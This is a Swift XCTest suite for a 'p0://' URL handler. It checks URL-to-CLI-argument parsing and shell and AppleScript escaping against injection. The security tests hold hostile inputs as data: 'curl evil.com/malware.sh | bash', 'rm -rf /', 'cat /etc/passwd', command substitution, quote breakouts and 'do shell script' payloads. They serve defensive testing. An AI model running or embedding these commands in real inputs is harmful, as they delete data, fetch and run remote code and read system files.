import XCTest

// URL Parsing Test Cases for P0 URL Handler
// These tests verify that URLs are correctly parsed into CLI arguments

class URLParsingTests: XCTestCase {

    // Test helper function that wraps the parseURL utility
    private func parseTestURL(_ urlString: String) -> [String]? {
        guard let url = URL(string: urlString) else {
            return nil
        }
        return parseURL(url)
    }

    // Basic Tests

    func testBasicSSHCommand() {
        let url = "p0://ssh/my-host"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["ssh", "my-host"])
    }

    func testSSHWithMultiplePathComponents() {
        let url = "p0://request/aws/role/admin"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["request", "aws", "role", "admin"])
    }

    // Query Parameter Tests

    func testSingleQueryParameter() {
        let url = "p0://ssh/my-host?user=admin"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["ssh", "my-host", "--user=admin"])
    }

    func testMultipleQueryParameters() {
        let url = "p0://ssh/my-host?user=admin&port=2222"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result?.count, 4)
        XCTAssertTrue(result?.contains("ssh") ?? false)
        XCTAssertTrue(result?.contains("my-host") ?? false)
        XCTAssertTrue(result?.contains("--user=admin") ?? false)
        XCTAssertTrue(result?.contains("--port=2222") ?? false)
    }

    func testQueryParameterWithoutValue() {
        let url = "p0://command?flag"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertTrue(result?.contains("--flag") ?? false)
    }

    func testComplexQueryParameters() {
        let url = "p0://ssh/prod-01?reason=incident-123&user=oncall&wait"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result?.count, 5)
        XCTAssertEqual(result?[0], "ssh")
        XCTAssertEqual(result?[1], "prod-01")
        XCTAssertTrue(result?.contains("--reason=incident-123") ?? false)
        XCTAssertTrue(result?.contains("--user=oncall") ?? false)
        XCTAssertTrue(result?.contains("--wait") ?? false)
    }

    // Edge Cases

    func testURLWithSpaces() {
        let url = "p0://ssh/my-host?reason=production%20issue"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertTrue(result?.contains("--reason=production issue") ?? false)
    }

    func testURLWithSpecialCharacters() {
        let url = "p0://ssh/my-host?reason=bug%23123"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertTrue(result?.contains { $0.contains("bug#123") } ?? false)
    }

    func testCommandOnly() {
        let url = "p0://request"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["request"])
    }

    func testEmptyURL() {
        let url = "p0://"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, [])
    }

    // Invalid URLs

    func testInvalidScheme() {
        let url = "http://ssh/my-host"
        let result = parseTestURL(url)

        XCTAssertNil(result)
    }

    // Security Tests - Command Injection Prevention

    func testCommandInjectionWithSemicolon() {
        // Attacker tries: p0://ssh/host?user=hacker; rm -rf /
        let url = "p0://ssh/host?user=hacker;%20rm%20-rf%20/"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result?[0], "ssh")
        XCTAssertEqual(result?[1], "host")

        // The malicious part should be in the argument
        let maliciousArg = result?.first { $0.contains(";") }
        XCTAssertNotNil(maliciousArg)
        XCTAssertEqual(maliciousArg, "--user=hacker; rm -rf /")

        // Verify shell escaping makes it safe
        let shellCommand = buildShellCommand(result!)
        XCTAssertTrue(shellCommand.contains("'--user=hacker; rm -rf /'"))
        XCTAssertFalse(shellCommand.contains("; rm -rf /\"")) // Should NOT have unescaped semicolon
    }

    func testCommandInjectionWithQuotes() {
        // Attacker tries: p0://ssh/host?user=admin" && curl evil.com/malware.sh | bash
        // Note: " gets stripped by URL parsing, but && remains
        let url = "p0://ssh/host?user=admin%20%26%26%20curl%20evil.com/malware.sh"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        let maliciousArg = result?.first { $0.contains("&&") }
        XCTAssertNotNil(maliciousArg)
        XCTAssertTrue(maliciousArg?.contains("admin") ?? false)
        XCTAssertTrue(maliciousArg?.contains("&&") ?? false)

        // Verify shell escaping makes it safe
        let shellCommand = buildShellCommand(result!)
        XCTAssertTrue(shellCommand.contains("&&"))
        // The malicious && should be wrapped in single quotes
        XCTAssertTrue(shellCommand.contains("'--user=admin && curl evil.com/malware.sh'"))
    }

    func testCommandInjectionWithBackticks() {
        // Attacker tries: p0://ssh/host?user=`whoami`
        let url = "p0://ssh/host?user=%60whoami%60"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        let maliciousArg = result?.first { $0.contains("`") }
        XCTAssertNotNil(maliciousArg)
        XCTAssertEqual(maliciousArg, "--user=`whoami`")

        // Verify shell escaping makes it safe
        let shellCommand = buildShellCommand(result!)
        XCTAssertTrue(shellCommand.contains("'--user=`whoami`'"))
        // Backticks should be wrapped in quotes, not executed
    }

    func testCommandInjectionWithDollarCommand() {
        // Attacker tries: p0://ssh/host?user=$(curl evil.com)
        let url = "p0://ssh/host?user=$(curl%20evil.com)"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        let maliciousArg = result?.first { $0.contains("$(") }
        XCTAssertNotNil(maliciousArg)
        XCTAssertEqual(maliciousArg, "--user=$(curl evil.com)")

        // Verify shell escaping makes it safe
        let shellCommand = buildShellCommand(result!)
        XCTAssertTrue(shellCommand.contains("'--user=$(curl evil.com)'"))
    }

    func testCommandInjectionWithPipe() {
        // Attacker tries: p0://ssh/host?user=admin | cat /etc/passwd
        // Note: URL encoding may preserve %20 as literal characters
        let url = "p0://ssh/host?user=admin%20|%20cat%20/etc/passwd"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        let maliciousArg = result?.first { $0.contains("|") }
        XCTAssertNotNil(maliciousArg)
        // Check that the malicious pipe character is present
        XCTAssertTrue(maliciousArg?.contains("|") ?? false)
        XCTAssertTrue(maliciousArg?.contains("admin") ?? false)

        // Verify shell escaping makes it safe
        let shellCommand = buildShellCommand(result!)
        // The pipe should be wrapped in single quotes
        XCTAssertTrue(shellCommand.contains("|"))
        XCTAssertTrue(shellCommand.contains("'--user="))
    }

    func testCommandInjectionWithNewline() {
        // Attacker tries: p0://ssh/host?user=admin%0Acurl evil.com
        let url = "p0://ssh/host?user=admin%0Acurl%20evil.com"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        let maliciousArg = result?.first { $0.contains("\n") }
        XCTAssertNotNil(maliciousArg)

        // Verify shell escaping makes it safe
        let shellCommand = buildShellCommand(result!)
        // Newline should be escaped
        XCTAssertTrue(shellCommand.contains("admin"))
        XCTAssertTrue(shellCommand.contains("curl"))
    }

    func testCommandInjectionInHostname() {
        // Attacker tries: p0://ssh;curl-evil.com/path
        let url = "p0://ssh;curl-evil.com/path"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        // The semicolon in hostname should be preserved
        XCTAssertTrue(result?[0].contains(";") ?? false)

        // Verify shell escaping makes it safe
        let shellCommand = buildShellCommand(result!)
        XCTAssertTrue(shellCommand.contains("'ssh;curl-evil.com'"))
    }

    func testCommandInjectionWithSingleQuotes() {
        // Attacker tries to break out of single quotes: p0://ssh/host?user=admin' ; curl evil.com ; echo '
        let url = "p0://ssh/host?user=admin'%20;%20curl%20evil.com%20;%20echo%20'"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        let maliciousArg = result?.first { $0.contains("'") }
        XCTAssertNotNil(maliciousArg)

        // Verify shell escaping properly escapes single quotes
        let shellCommand = buildShellCommand(result!)
        // Single quotes should be escaped as '\''
        XCTAssertTrue(shellCommand.contains("\\'"))
    }

    func testMultipleInjectionAttempts() {
        // Attacker tries multiple techniques: p0://ssh/host?user=admin; curl evil.com | bash &
        let url = "p0://ssh/host?user=admin;%20curl%20evil.com%20%7C%20bash%20%26"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result?.count, 3) // ssh, host, --user=...

        // All malicious characters should be in the argument
        let maliciousArg = result?[2]
        XCTAssertTrue(maliciousArg?.contains("admin") ?? false)
        // Check that malicious content is present (either as chars or words)
        let hasInjection = (maliciousArg?.contains(";") ?? false) ||
                          (maliciousArg?.contains("curl") ?? false) ||
                          (maliciousArg?.contains("|") ?? false) ||
                          (maliciousArg?.contains("bash") ?? false)
        XCTAssertTrue(hasInjection)

        // Verify shell escaping makes it all safe - the key is that special chars are wrapped
        let shellCommand = buildShellCommand(result!)
        XCTAssertTrue(shellCommand.contains("'--user="))
    }

    func testLegitimateComplexArguments() {
        // Ensure legitimate complex arguments still work
        let url = "p0://ssh/host?reason=Investigating%20issue%20%23123%20(urgent)"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result?.count, 3)
        // Check for key parts of the string
        XCTAssertTrue(result?[2].contains("Investigating") ?? false)
        XCTAssertTrue(result?[2].contains("issue") ?? false)
        XCTAssertTrue(result?[2].contains("123") ?? false)

        // Verify escaping preserves the legitimate content
        let shellCommand = buildShellCommand(result!)
        XCTAssertTrue(shellCommand.contains("'--reason=Investigating"))
        XCTAssertTrue(shellCommand.contains("123"))
    }

    func testDashboardExample() {
        let url = "p0://ssh/prod-db-01?reason=investigation"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result, ["ssh", "prod-db-01", "--reason=investigation"])
    }

    func testAWSRoleRequest() {
        let url = "p0://request/aws/role/developer?reason=deployment&wait=true"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result?.count, 6)
        XCTAssertEqual(result?[0], "request")
        XCTAssertEqual(result?[1], "aws")
        XCTAssertEqual(result?[2], "role")
        XCTAssertEqual(result?[3], "developer")
        XCTAssertTrue(result?.contains("--reason=deployment") ?? false)
        XCTAssertTrue(result?.contains("--wait=true") ?? false)
    }

    func testGCloudRoleRequest() {
        let url = "p0://request/gcloud/role/bigquery.admin?reason=data-analysis"
        let result = parseTestURL(url)

        XCTAssertNotNil(result)
        XCTAssertEqual(result?.count, 5)
        XCTAssertEqual(result?[0], "request")
        XCTAssertEqual(result?[1], "gcloud")
        XCTAssertEqual(result?[2], "role")
        XCTAssertEqual(result?[3], "bigquery.admin")
        XCTAssertTrue(result?.contains("--reason=data-analysis") ?? false)
    }

    // ================================================================================
    // Unit Tests for shellEscape() - Shell Injection Prevention
    // ================================================================================

    func testShellEscapeBasicString() {
        let input = "hello"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'hello'")
    }

    func testShellEscapeWithSingleQuote() {
        // Most critical test: single quotes must be properly escaped to prevent breaking out
        let input = "admin' ; rm -rf / ; echo '"
        let result = shellEscape(input)
        // Single quote should be escaped as: '\''
        // The full escape sequence is: close quote, escaped quote, open quote
        XCTAssertEqual(result, "'admin'\\'' ; rm -rf / ; echo '\\'''")

        // Verify this actually prevents command injection by checking structure
        XCTAssertTrue(result.hasPrefix("'"))
        XCTAssertTrue(result.hasSuffix("'"))
        XCTAssertTrue(result.contains("\\'"))
    }

    func testShellEscapeWithSemicolon() {
        let input = "user; rm -rf /"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'user; rm -rf /'")
        // Semicolon should be wrapped in single quotes, making it literal
    }

    func testShellEscapeWithAmpersand() {
        let input = "user && curl evil.com"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'user && curl evil.com'")
    }

    func testShellEscapeWithBackticks() {
        let input = "`whoami`"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'`whoami`'")
        // Backticks should be literal, not executed
    }

    func testShellEscapeWithDollarParentheses() {
        let input = "$(curl evil.com)"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'$(curl evil.com)'")
        // Command substitution should be literal
    }

    func testShellEscapeWithPipe() {
        let input = "admin | cat /etc/passwd"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'admin | cat /etc/passwd'")
    }

    func testShellEscapeWithRedirection() {
        let input = "admin > /tmp/hack"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'admin > /tmp/hack'")
    }

    func testShellEscapeWithNewline() {
        let input = "admin\ncurl evil.com"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'admin\ncurl evil.com'")
        // Newline should be preserved but literal
    }

    func testShellEscapeWithTab() {
        let input = "admin\tmalicious"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'admin\tmalicious'")
    }

    func testShellEscapeWithDollarVariable() {
        let input = "$HOME/evil"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'$HOME/evil'")
        // Variable expansion should not occur
    }

    func testShellEscapeWithBackslash() {
        let input = "admin\\ntest"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'admin\\ntest'")
        // Backslash should be literal
    }

    func testShellEscapeWithDoubleQuotes() {
        let input = "admin\"test"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'admin\"test'")
        // Double quotes should be literal inside single quotes
    }

    func testShellEscapeWithAsterisk() {
        let input = "admin*"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'admin*'")
        // Glob patterns should not expand
    }

    func testShellEscapeEmptyString() {
        let input = ""
        let result = shellEscape(input)
        XCTAssertEqual(result, "''")
    }

    func testShellEscapeWithMultipleSingleQuotes() {
        let input = "a'b'c'd"
        let result = shellEscape(input)
        XCTAssertEqual(result, "'a'\\''b'\\''c'\\''d'")
    }

    func testShellEscapeComplexAttack() {
        // Realistic attack combining multiple techniques
        let input = "'; curl http://evil.com/$(whoami) | bash #"
        let result = shellEscape(input)
        // Should escape the single quote and wrap everything safely
        XCTAssertTrue(result.contains("\\'"))
        XCTAssertTrue(result.hasPrefix("'"))
        // The entire malicious payload should be neutralized
    }

    // ================================================================================
    // Unit Tests for applescriptEscape() - AppleScript Injection Prevention
    // ================================================================================

    func testApplescriptEscapeBasicString() {
        let input = "hello"
        let result = applescriptEscape(input)
        XCTAssertEqual(result, "hello")
    }

    func testApplescriptEscapeWithDoubleQuote() {
        // Critical: double quotes must be escaped to prevent breaking out of AppleScript strings
        let input = "admin\" & do shell script \"curl evil.com\" & \""
        let result = applescriptEscape(input)
        XCTAssertEqual(result, "admin\\\" & do shell script \\\"curl evil.com\\\" & \\\"")

        // Verify all double quotes are escaped - check that escaped quotes are present
        XCTAssertTrue(result.contains("\\\""))
        // Count original quotes and escaped quotes to ensure all are escaped
        let originalQuoteCount = input.filter { $0 == "\"" }.count
        let escapedQuoteCount = result.components(separatedBy: "\\\"").count - 1
        XCTAssertEqual(originalQuoteCount, escapedQuoteCount)
    }

    func testApplescriptEscapeWithBackslash() {
        // Backslashes must be escaped first to prevent them from escaping other characters
        let input = "admin\\test"
        let result = applescriptEscape(input)
        XCTAssertEqual(result, "admin\\\\test")
    }

    func testApplescriptEscapeWithBackslashAndQuote() {
        // Both backslashes and quotes - order matters!
        let input = "admin\\\" test"
        let result = applescriptEscape(input)
        // Backslash should be escaped first: \ -> \\
        // Then quote should be escaped: " -> \"
        // Result: admin\\" test -> admin\\\\" test
        XCTAssertEqual(result, "admin\\\\\\\" test")
    }

    func testApplescriptEscapeWithMultipleQuotes() {
        let input = "say \"hello\" then \"goodbye\""
        let result = applescriptEscape(input)
        XCTAssertEqual(result, "say \\\"hello\\\" then \\\"goodbye\\\"")
    }

    func testApplescriptEscapeWithNewline() {
        let input = "line1\nline2"
        let result = applescriptEscape(input)
        // Newlines should pass through (AppleScript can handle them in strings)
        XCTAssertEqual(result, "line1\nline2")
    }

    func testApplescriptEscapeWithSingleQuote() {
        let input = "don't"
        let result = applescriptEscape(input)
        // Single quotes are fine in AppleScript double-quoted strings
        XCTAssertEqual(result, "don't")
    }

    func testApplescriptEscapeEmptyString() {
        let input = ""
        let result = applescriptEscape(input)
        XCTAssertEqual(result, "")
    }

    func testApplescriptEscapeWithAmpersand() {
        // AppleScript uses & for string concatenation - should be escaped
        let input = "a & b"
        let result = applescriptEscape(input)
        // Our function doesn't escape &, which could be a concern
        // but in the context of shell commands inside do script, it's part of the shell command
        XCTAssertEqual(result, "a & b")
    }

    func testApplescriptEscapeComplexAttack() {
        // Attempt to break out and execute arbitrary AppleScript
        let input = "\" & do shell script \"rm -rf /\" & \""
        let result = applescriptEscape(input)
        XCTAssertEqual(result, "\\\" & do shell script \\\"rm -rf /\\\" & \\\"")

        // Verify the attack is neutralized - all quotes should be escaped
        XCTAssertTrue(result.contains("\\\""))
        // Count original quotes and escaped quotes to ensure all are escaped
        let originalQuoteCount = input.filter { $0 == "\"" }.count
        let escapedQuoteCount = result.components(separatedBy: "\\\"").count - 1
        XCTAssertEqual(originalQuoteCount, escapedQuoteCount)
    }

    func testApplescriptEscapeWithBackslashEscapeSequence() {
        // Test a backslash followed by a character that might be misinterpreted
        let input = "\\n\\t\\r"
        let result = applescriptEscape(input)
        XCTAssertEqual(result, "\\\\n\\\\t\\\\r")
    }

    func testApplescriptEscapeWithPath() {
        // Test a common scenario: file paths with backslashes (Windows-style)
        let input = "C:\\Users\\Admin\\file.txt"
        let result = applescriptEscape(input)
        XCTAssertEqual(result, "C:\\\\Users\\\\Admin\\\\file.txt")
    }

    // ================================================================================
    // Integration Tests - Combined Shell and AppleScript Escaping
    // ================================================================================

    func testCombinedEscapingWithQuotes() {
        // Simulate the full escaping chain as used in executeCommand
        let argument = "--user=admin\" && curl evil.com"

        // Step 1: Shell escape
        let shellEscaped = shellEscape(argument)
        XCTAssertEqual(shellEscaped, "'--user=admin\" && curl evil.com'")

        // Step 2: AppleScript escape
        let appleScriptEscaped = applescriptEscape(shellEscaped)
        // Single quotes don't need escaping in AppleScript double-quoted strings
        XCTAssertEqual(appleScriptEscaped, "'--user=admin\\\" && curl evil.com'")
    }

    func testCombinedEscapingWithBackslash() {
        let argument = "--path=C:\\Users"

        let shellEscaped = shellEscape(argument)
        XCTAssertEqual(shellEscaped, "'--path=C:\\Users'")

        let appleScriptEscaped = applescriptEscape(shellEscaped)
        XCTAssertEqual(appleScriptEscaped, "'--path=C:\\\\Users'")
    }

    func testCombinedEscapingComplexAttack() {
        // Simulate an attacker trying to break through both layers
        let argument = "'; curl evil.com | bash ; echo \"hacked\""

        // Step 1: Shell escape - neutralizes the shell injection
        let shellEscaped = shellEscape(argument)
        XCTAssertTrue(shellEscaped.contains("\\'"))
        XCTAssertTrue(shellEscaped.contains("\""))

        // Step 2: AppleScript escape - neutralizes any AppleScript injection
        let appleScriptEscaped = applescriptEscape(shellEscaped)
        XCTAssertTrue(appleScriptEscaped.contains("\\\""))

        // Verify the final result is safe for AppleScript
        XCTAssertFalse(appleScriptEscaped.contains("\" &"))
    }
}

// Test Runner (for command-line execution)

extension URLParsingTests {
    static func runAllTests() {
        let tests = URLParsingTests()

        print("Running URL Parsing Tests...")
        print("============================\n")

        let testMethods: [(String, () -> Void)] = [
            ("testBasicSSHCommand", tests.testBasicSSHCommand),
            ("testSSHWithMultiplePathComponents", tests.testSSHWithMultiplePathComponents),
            ("testSingleQueryParameter", tests.testSingleQueryParameter),
            ("testMultipleQueryParameters", tests.testMultipleQueryParameters),
            ("testQueryParameterWithoutValue", tests.testQueryParameterWithoutValue),
            ("testComplexQueryParameters", tests.testComplexQueryParameters),
            ("testURLWithSpaces", tests.testURLWithSpaces),
            ("testURLWithSpecialCharacters", tests.testURLWithSpecialCharacters),
            ("testCommandOnly", tests.testCommandOnly),
            ("testEmptyURL", tests.testEmptyURL),
            ("testInvalidScheme", tests.testInvalidScheme),
            ("testCommandInjectionWithSemicolon", tests.testCommandInjectionWithSemicolon),
            ("testCommandInjectionWithQuotes", tests.testCommandInjectionWithQuotes),
            ("testCommandInjectionWithBackticks", tests.testCommandInjectionWithBackticks),
            ("testCommandInjectionWithDollarCommand", tests.testCommandInjectionWithDollarCommand),
            ("testCommandInjectionWithPipe", tests.testCommandInjectionWithPipe),
            ("testCommandInjectionWithNewline", tests.testCommandInjectionWithNewline),
            ("testCommandInjectionInHostname", tests.testCommandInjectionInHostname),
            ("testCommandInjectionWithSingleQuotes", tests.testCommandInjectionWithSingleQuotes),
            ("testMultipleInjectionAttempts", tests.testMultipleInjectionAttempts),
            ("testLegitimateComplexArguments", tests.testLegitimateComplexArguments),
            ("testDashboardExample", tests.testDashboardExample),
            ("testAWSRoleRequest", tests.testAWSRoleRequest),
            ("testGCloudRoleRequest", tests.testGCloudRoleRequest),
            // shellEscape() unit tests
            ("testShellEscapeBasicString", tests.testShellEscapeBasicString),
            ("testShellEscapeWithSingleQuote", tests.testShellEscapeWithSingleQuote),
            ("testShellEscapeWithSemicolon", tests.testShellEscapeWithSemicolon),
            ("testShellEscapeWithAmpersand", tests.testShellEscapeWithAmpersand),
            ("testShellEscapeWithBackticks", tests.testShellEscapeWithBackticks),
            ("testShellEscapeWithDollarParentheses", tests.testShellEscapeWithDollarParentheses),
            ("testShellEscapeWithPipe", tests.testShellEscapeWithPipe),
            ("testShellEscapeWithRedirection", tests.testShellEscapeWithRedirection),
            ("testShellEscapeWithNewline", tests.testShellEscapeWithNewline),
            ("testShellEscapeWithTab", tests.testShellEscapeWithTab),
            ("testShellEscapeWithDollarVariable", tests.testShellEscapeWithDollarVariable),
            ("testShellEscapeWithBackslash", tests.testShellEscapeWithBackslash),
            ("testShellEscapeWithDoubleQuotes", tests.testShellEscapeWithDoubleQuotes),
            ("testShellEscapeWithAsterisk", tests.testShellEscapeWithAsterisk),
            ("testShellEscapeEmptyString", tests.testShellEscapeEmptyString),
            ("testShellEscapeWithMultipleSingleQuotes", tests.testShellEscapeWithMultipleSingleQuotes),
            ("testShellEscapeComplexAttack", tests.testShellEscapeComplexAttack),
            // applescriptEscape() unit tests
            ("testApplescriptEscapeBasicString", tests.testApplescriptEscapeBasicString),
            ("testApplescriptEscapeWithDoubleQuote", tests.testApplescriptEscapeWithDoubleQuote),
            ("testApplescriptEscapeWithBackslash", tests.testApplescriptEscapeWithBackslash),
            ("testApplescriptEscapeWithBackslashAndQuote", tests.testApplescriptEscapeWithBackslashAndQuote),
            ("testApplescriptEscapeWithMultipleQuotes", tests.testApplescriptEscapeWithMultipleQuotes),
            ("testApplescriptEscapeWithNewline", tests.testApplescriptEscapeWithNewline),
            ("testApplescriptEscapeWithSingleQuote", tests.testApplescriptEscapeWithSingleQuote),
            ("testApplescriptEscapeEmptyString", tests.testApplescriptEscapeEmptyString),
            ("testApplescriptEscapeWithAmpersand", tests.testApplescriptEscapeWithAmpersand),
            ("testApplescriptEscapeComplexAttack", tests.testApplescriptEscapeComplexAttack),
            ("testApplescriptEscapeWithBackslashEscapeSequence", tests.testApplescriptEscapeWithBackslashEscapeSequence),
            ("testApplescriptEscapeWithPath", tests.testApplescriptEscapeWithPath),
            // Integration tests
            ("testCombinedEscapingWithQuotes", tests.testCombinedEscapingWithQuotes),
            ("testCombinedEscapingWithBackslash", tests.testCombinedEscapingWithBackslash),
            ("testCombinedEscapingComplexAttack", tests.testCombinedEscapingComplexAttack),
        ]

        var passed = 0
        var failed = 0

        for (name, test) in testMethods {
            do {
                test()
                print("✓ \(name)")
                passed += 1
            } catch {
                print("✗ \(name): \(error)")
                failed += 1
            }
        }

        print("\n============================")
        print("Results: \(passed) passed, \(failed) failed")
    }
}
